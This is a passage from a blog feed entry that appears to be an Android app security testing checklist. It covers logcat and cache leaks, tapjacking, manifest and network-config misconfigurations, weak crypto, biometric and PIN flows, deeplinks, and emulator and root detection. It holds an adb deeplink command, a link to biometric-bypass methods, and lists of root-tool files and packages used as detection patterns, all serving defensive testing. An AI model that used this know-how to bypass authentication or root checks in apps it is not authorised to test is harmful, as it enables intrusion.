</code></pre></div></div> <p>Recommended to maximum interact parts of application which use user data to leak it in logcat. After, grep these sensitive data in saved part of logs.</p> <h4 id="cache">cache</h4> <p>Check at the backend’s caching permission - the Cache-Control HTTP-Header does not contain the no-cache, no-store, must-revalidate directive for authorization requests and responses.<br/> If it is, grep for various sensitive data in /data/data/android_app/cache.</p> <hr/> <h3 id="tapjacking">Tapjacking</h3> <p>Analogue of web-vulnerability clickjacking for Android. <br/> More detailed information and recommendations for fixing is <a href="https://developer.android.com/topic/security/risks/tapjacking">here</a>.<br/> Check it by installing <a href="https://github.com/dzmitry-savitski/tapjacker">APK</a> and try that tapjacker application obscuring the activity of the testing application.</p> <hr/> <h3 id="androidmanifestxml-misconfig">AndroidManifest.xml misconfig</h3> <p>Check backup is not allowed (<strong>android:allowBackup=true</strong>) <br/> Check debug mode is turned off (<strong>android:debuggable=true</strong>) <br/> Check unsecured traffic not permitted (<strong>android:usesCleartextTraffic=true</strong>)</p> <hr/> <h3 id="network_security_configxml-misconfig">network_security_config.xml misconfig</h3> <p>Config file path - resources/res/xml/network_security_config.xml. <br/> If network_security_config is specified in the AndroidManifest.xml, then it is worth checking for the presence of the <strong>cleartextTrafficPermitted=”true”</strong> setting and the trust-anchors tag.</p> <p>Example of vulnerable config:</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;domain-config</span> <span class="na">cleartextTrafficPermitted=</span><span class="s">"true"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;domain</span> <span class="na">includeSubdomains=</span><span class="s">"true"</span><span class="nt">&gt;</span>testdomain.com
    <span class="nt">&lt;/domain&gt;</span>
<span class="nt">&lt;/domain-config&gt;</span>
...
<span class="nt">&lt;trust-anchors&gt;</span>
        <span class="nt">&lt;certificates</span> <span class="na">src=</span><span class="s">"user"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;certificates</span> <span class="na">src=</span><span class="s">"system"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/trust-anchors&gt;</span>
</code></pre></div></div> <hr/> <h3 id="weak-crypto">Weak Crypto</h3> <h4 id="algorithms">Algorithms</h4> <p>Check the keywords by code or scanners and see if the data is used by the algorithm.<br/> Vulnerable encryption algorithms: DES, 3DES, RC2, RC4, BLOWFISH<br/> Vulnerable hashing algorithms: MD5, MD4, SHA1 <br/> Recommended: AES and SHA-256</p> <h4 id="random-function">Random function</h4> <p>Bad decision for generating numbers of sensetive data - <strong>java.util.Random</strong><br/> Good one - <strong>java.security.SecureRandom</strong></p> <hr/> <h3 id="insecure-biometric-authentication">Insecure biometric authentication</h3> <p>Code example of biometric key generation by alias:</p> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="nc">SecretKey</span> <span class="nf">genSecretKeyByAlias</span><span class="o">(</span><span class="nc">String</span> <span class="n">alias</span><span class="o">)</span> <span class="o">{</span>

  <span class="nc">KeyGenerator</span> <span class="n">keyGenerator</span> <span class="o">=</span> <span class="nc">KeyGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span>
    <span class="nc">KeyProperties</span><span class="o">.</span><span class="na">KEY_ALGORITHM_AES</span><span class="o">,</span> 
    <span class="no">KEYSTORE</span><span class="o">);</span>

  <span class="nc">KeyGenParameterSpec</span><span class="o">.</span><span class="na">Builder</span> <span class="n">builder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">KeyGenParameterSpec</span><span class="o">.</span><span class="na">Builder</span><span class="o">(</span>
    <span class="n">alias</span><span class="o">,</span> 
    <span class="nc">KeyProperties</span><span class="o">.</span><span class="na">PURPOSE_ENCRYPT</span> <span class="o">|</span> <span class="nc">KeyProperties</span><span class="o">.</span><span class="na">PURPOSE_DECRYPT</span><span class="o">);</span>

  <span class="n">builder</span><span class="o">.</span><span class="na">setKeySize</span><span class="o">(</span><span class="nc">AesConstants</span><span class="o">.</span><span class="na">KEY_LENGTH</span><span class="o">);</span>
  <span class="n">builder</span><span class="o">.</span><span class="na">setBlockModes</span><span class="o">(</span><span class="nc">AesConstants</span><span class="o">.</span><span class="na">BLOCK_MODE</span><span class="o">);</span>
  <span class="n">builder</span><span class="o">.</span><span class="na">setEncryptionPaddings</span><span class="o">(</span><span class="nc">AesConstants</span><span class="o">.</span><span class="na">PADDING</span><span class="o">);</span>
  <span class="n">builder</span><span class="o">.</span><span class="na">setUserAuthenticationRequired</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
  <span class="n">builder</span><span class="o">.</span><span class="na">setRandomizedEncryptionRequired</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
  <span class="n">keyGenerator</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">builder</span><span class="o">.</span><span class="na">build</span><span class="o">());</span>
  <span class="k">return</span> <span class="n">keyGenerator</span><span class="o">.</span><span class="na">generateKey</span><span class="o">();</span>
  <span class="o">...</span>
</code></pre></div></div> <p>It is necessary to check that the <strong>setInvalidatedByBiometricEnrollment</strong> option is not set to false. <br/> Look at the entire biometrics verification flow: generating a key, adding it to the keystore, interacting with share_prefs, creating a CryptoObject, checking all cryptographic algorithms that are used, e.t.c.<br/> Useful video is <a href="https://www.youtube.com/watch?v=uN6IocCyIF0&amp;t=1207s">here</a>.</p> <p><a href="https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/bypass-biometric-authentication-android">Methods</a> to bypass biometric in Android.</p> <hr/> <h3 id="proguard-turned-off">ProGuard turned off</h3> <p>Check file build.gradle in repository to determine, if ProGuard is used.<br/> Option minifyEnabled must be set in true.</p> <p>Example of secure configured gradle file:</p> <pre><code class="language-grandle">buildTypes {
        debug {
            firebaseCrashlytics {
                mappingFileUploadEnabled false
                nativeSymbolUploadEnabled false
}
} release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.
txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.release
}
...
</code></pre> <hr/> <h3 id="deeplink-exploitation">Deeplink exploitation</h3> <p>Testing deeplinks similar to searching web client-side vulnerabilities (csrf, session hijacking and e.t.c).<br/> Check custom schemes in intent-filter tag in AndroidManifest.xml. <br/> Example below can let to use deeplinks like <strong>myapp://user/somedata/</strong> or <strong>mysuperapp://user/somedata</strong>.</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;intent-filter</span> <span class="na">android:label=</span><span class="s">"@string/filter_view_myapp_account"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;data</span> <span class="na">android:host=</span><span class="s">"user"</span> <span class="na">android:pathPrefix=</span><span class="s">"/"</span> <span class="na">android:scheme=</span><span class="s">"myapp"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;data</span> <span class="na">android:host=</span><span class="s">"user"</span> <span class="na">android:pathPrefix=</span><span class="s">"/"</span> <span class="na">android:scheme=</span><span class="s">"mysuperapp"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/intent-filter&gt;</span>
</code></pre></div></div> <p>Adb command to trigger deeplink in Android:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adb shell am start <span class="nt">-W</span> <span class="nt">-a</span> android.intent.action.VIEW <span class="nt">-d</span> <span class="s2">"myapp://user"</span>
</code></pre></div></div> <hr/> <h3 id="insecure-pin-code-authentication">Insecure pin-code authentication</h3> <p>Just as in the case of biometrics, check the entire flow: generating a key, adding it to the keystore, interacting with share_prefs, creating a CryptoObject, checking all cryptographic algorithms that are used, e.t.c.</p> <ol> <li>It is necessary to check whether the key can be restored using the values from shared_prefs.</li> <li>Is EncryptedSharedPreferences used for sensitive data</li> </ol> <hr/> <h3 id="timeout-no-reauthentication">Timeout no reauthentication</h3> <p>Applications that handle sensitive data should, as a good security practice, re-prompt for a PIN or another authentication after some time of inactivity.<br/> The blocking time should be within reasonable limits.</p> <p>Possible steps to check:</p> <ul> <li>Disable auto-lock screen</li> <li>Log in to the application</li> <li>Check the PIN code request when the application is open <ul> <li>Leave the application open for some time (for example 15 minutes)</li> <li>If the application does not ask you to enter the PIN code again, then the application is vulnerable</li> </ul> </li> <li>Check the PIN code request when the application is minimized <ul> <li>Minimize the application and leave it for a while</li> <li>We return to the application and check the appearance of the PIN code entry window</li> </ul> </li> </ul> <hr/> <h3 id="keyboard-cache">Keyboard cache</h3> <p>Check text fields that can process sensitive data for the presence of the <strong>textNoSuggestions</strong> flag, as in the code below:</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;EditText</span> <span class="na">android:id=</span><span class="s">"@+id/KeyBoardCache"</span> <span class="na">android:inputType=</span><span class="s">"textNoSuggestions"</span><span class="nt">/&gt;</span>
</code></pre></div></div> <hr/> <h3 id="emulator-detection">Emulator detection</h3> <p>Detection is straight-forward: try to run the application on a emulated Android device (Android studio, genymotion) and check if it gives a warning or stops running.</p> <p>A good binary security practice with emulator detection is using two more different type of checks.<br/> Some check examples:</p> <ul> <li>Searching for files specific to different emulators: <strong>qemu_trace</strong>, <strong>qemu-props</strong>, <strong>/dev/socket/genyd</strong>, <strong>genyd</strong> and e.t.c.</li> <li>Checking system properties: <strong>ro.debuggable</strong>, <strong>ro.kernel.android.qemud</strong>, <strong>ro.kernel.qemu.gles</strong></li> <li>Checking classes fields like Build: “FINGERPRINT”, “MODEL”, “MANUFACTURER”, “BRAND”, “BOARD”, “ID”, “SERIAL”, “TAGS”, “USER”, “HARDWARE”,”PRODUCT”, “TYPE”.</li> <li>Telephony check: phone number in the list of known fake numbers, device_id in the list of known fake device_ids, e.t.c.</li> </ul> <p>Thanks to Stingray for <a href="https://saas.stingray-mobile.ru/knowledgebase/2023.6/rg/ru/android/insufficient_emulator_start-up_check/">material</a>.</p> <hr/> <h3 id="root-detection">Root detection</h3> <p>Detection is straight-forward: try to run the application on a rooted Android device and check if it gives a warning or stops running.</p> <p>A good binary security practice with root detection is using two more different type of checks.<br/> Some check examples:</p> <ul> <li>Searching for files like su, busybox, supersu, Superuser.apk, KingoUser.apk, SuperSu.apk, magisk and e.t.c.</li> <li>Searching for root packages like <strong>com.noshufou.android.su</strong>, <strong>com.noshufou.android.su.elite</strong>, <strong>eu.chainfire.supersu</strong>, <strong>com.koushikdutta.superuser</strong> and e.t.c.</li> <li>Checking system properties: <strong>ro.build.selinux</strong>, <strong>ro.debuggable</strong>, <strong>service.adb.root</strong>, <strong>ro.secure</strong></li> <li>Checking if it has rights to read/write private folders/files (<strong>File.canRead</strong>, <strong>File.canWrite</strong> and C-function <strong>access()</strong>)</li> <li>Checking if it has rights to run root commands (for example via function below) <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">process</span> <span class="o">=</span> <span class="nc">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="k">new</span> <span class="nc">String</span><span class="o">[]{</span><span class="s">"which"</span><span class="o">,</span> <span class="s">"su"</span><span class="o">});</span>
</code></pre></div> </div> </li> <li>Checking running of root proccess (for example via <strong>ActivityManager.getRunningAppProcesses</strong> or <strong>getRecentTasks</strong>)</li> </ul> <p>Thanks to Stingray for <a href="https://saas.stingray-mobile.ru/knowledgebase/2023.6/rg/ru/android/insufficient_root_access_check/">material</a>.</p> <hr/>]]></content><author><name></name></author><category term="cheetsheet"/><category term="android"/><category term="appsec"/><category term="cheetsheet"/><summary type="html"><![CDATA[Check list of android application for AppSec-engineers]]></summary></entry></feed>